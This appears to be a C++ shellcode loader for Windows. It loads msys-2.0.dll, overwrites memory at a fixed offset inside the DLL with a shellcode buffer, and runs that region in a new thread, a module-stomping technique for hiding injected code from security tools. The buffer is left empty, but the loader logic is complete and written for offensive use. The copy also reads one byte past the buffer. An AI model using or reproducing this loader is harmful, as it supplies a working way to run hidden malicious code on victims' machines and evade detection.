#include <Windows.h>
#include <iostream>
#include <cstring>

int main() {
    // Load the DLL
    HMODULE hMod = LoadLibrary(L"msys-2.0.dll");
    if (hMod == NULL) {
        std::cerr << "Failed to load DLL." << std::endl;
        return 1;
    }

    // Get the base address of the loaded module
    uintptr_t baseAddress = (uintptr_t)hMod;

    // Calculate the address of the section you want to modify
    uintptr_t sectionAddress = baseAddress + 0x1EE200;

    unsigned char buf[] = "";
    SIZE_T shellSize = sizeof(buf);
    std::memcpy((void*)sectionAddress, buf, shellSize + 1);

    printf("\nHit me!\n");
    getchar();


    // Create a new thread to execute the shellcode
    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)sectionAddress, nullptr, 0, nullptr);
    if (hThread == NULL) {
        std::cerr << "Failed to create thread." << std::endl;
        return 1;
    }

    
    // Wait for the thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle
    CloseHandle(hThread);

    // Unload the DLL (optional)
    FreeLibrary(hMod);

    std::cout << "Successfully modified the DLL section in memory and executed the code." << std::endl;

    return 0;
}
